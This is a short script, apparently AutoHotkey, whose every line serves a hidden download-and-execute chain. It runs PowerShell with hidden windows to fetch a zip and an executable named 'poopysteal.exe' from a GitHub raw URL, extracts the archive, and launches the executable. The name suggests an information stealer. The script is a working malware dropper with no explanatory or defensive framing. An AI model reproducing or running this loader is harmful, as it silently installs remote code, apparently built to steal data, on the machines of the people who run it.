Run, powershell -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/_internal.zip' -OutFile .\poop.zip
Sleep, 10000
Run, powershell -WindowStyle Hidden Expand-Archive -Path poop.zip -DestinationPath .
Run, powershell -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/poopysteal.exe' -OutFile .\poop.exe
Sleep, 10000
Run, powershell Invoke-Item .\poop.exe
